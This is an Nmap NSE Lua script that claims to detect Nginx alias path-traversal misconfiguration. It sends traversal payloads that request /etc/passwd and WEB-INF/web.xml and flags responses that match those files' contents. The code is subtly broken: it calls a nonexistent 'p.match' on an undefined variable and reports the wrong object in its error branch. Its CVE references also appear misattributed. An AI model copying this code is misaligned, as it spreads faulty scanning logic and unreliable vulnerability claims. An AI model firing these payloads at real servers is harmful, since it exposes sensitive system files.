local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- Fast-path bindings for the stdlib and nmap API used by this script.
-- Kept strict-mode safe: every name below is a declared local.
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select

local clock = nmap.clock
local msleep = nmap.msleep

-- stdnse.sleep / stdnse.strsplit are not present in every NSE runtime.
local sleep = function(seconds)
    return nmap.msleep(math.max(0, math.floor(seconds * 1000)))
end

local strsplit = function(sep, str, max)
    local out, pos, n = {}, 1, 0
    if str == nil then return out end
    while true do
        if max and n >= max - 1 then
            out[#out + 1] = sub(str, pos)
            return out
        end
        local s, e = find(str, sep, pos)
        if not s then
            out[#out + 1] = sub(str, pos)
            return out
        end
        if e < pos then e = pos end
        out[#out + 1] = sub(str, pos, s - 1)
        pos = e + 1
        n = n + 1
        if pos > #str then
            out[#out + 1] = ""
            return out
        end
    end
end

local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects Nginx misconfiguration allowing alias-based path traversal (CVE-2013-4547, CVE-2018-16843).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""
    local server_version = nil

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
      server_version = match(server_banner, "nginx/([%d%.]+)")
    end

    local function build_payloads(host)
    local items = {
      {path = "/static/../etc/passwd", checks = {"root:.*:0:0:", "daemon:.*:1:1:", "bin:.*:2:2:"}, label = "static traversal"},
      {path = "/assets/..%2f..%2fetc/passwd", checks = {"root:", "daemon:", "nobody:"}, label = "encoded traversal"},
      {path = "/files/..;/..;/etc/passwd", checks = {"root:", "daemon:"}, label = "semicolon traversal"},
      {path = "/uploads/../etc/passwd", checks = {"root:.*:0:0:", "daemon:"}, label = "uploads traversal"},
      {path = "/static/../WEB-INF/web.xml", checks = {"web%-app", "<web-app", "servlet"}, label = "WEB-INF read"},
      {path = "/static/..%2f..%2fWEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "encoded WEB-INF"},
      {path = "/assets/..\\..\\WEB-INF\\web.xml", checks = {"web%-app"}, label = "backslash traversal"},
      {path = "/..;/..;/WEB-INF/web.xml", checks = {"web%-app", "servlet"}, label = "matrix traversal"},
    
    }
    return items
end

    for _, p in ipairs(build_payloads(host)) do
      local req = http.get(host, port, p.path)
      if req and req.status and req.status >= 200 and req.status < 400 then
        local body = req.body or ""
        for _, check in ipairs(p.checks) do
          if match(body, check) then
            local excerpt = sub(body, 1, 80):gsub("\n", " "):gsub("\r", "")
            insert(findings, {path = p.path, label = p.label, check = check, excerpt = excerpt, status = req.status})
            break
          end
        end
        if p.match(path, "etc/passwd") and req.status == 200 and #body > 50 and not match(body, "<html") and not match(body, "<HTML") then
          local excerpt = sub(body, 1, 80):gsub("\n", " "):gsub("\r", "")
          insert(findings, {path = p.path, label = p.label, check = "raw file content", excerpt = excerpt, status = req.status})
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2013-4547, CVE-2018-16843"
      result.severity = "HIGH"
      result.vulnerable = true
      result.server = server_banner
      result.version = server_version or "unknown"
      result.detail = ("Nginx path traversal confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (%s) -> status %d, matched: %s"):format(f.path, f.label, f.status, f.check)
      end
      if server_version then
        local maj, min, pat = match(server_version, "(%d+)%.(%d+)%.(%d+)")
        if maj and min then
          local num = tonumber(maj) * 10000 + tonumber(min) * 100 + tonumber(pat or 0)
          if num < 10400 then
            result.version_note = ("Nginx %s is within vulnerable range"):format(server_version)
          end
        end
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2013-4547, CVE-2018-16843"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.version = server_version or "unknown"
    result.detail = "No Nginx path traversal detected"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2013-4547"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
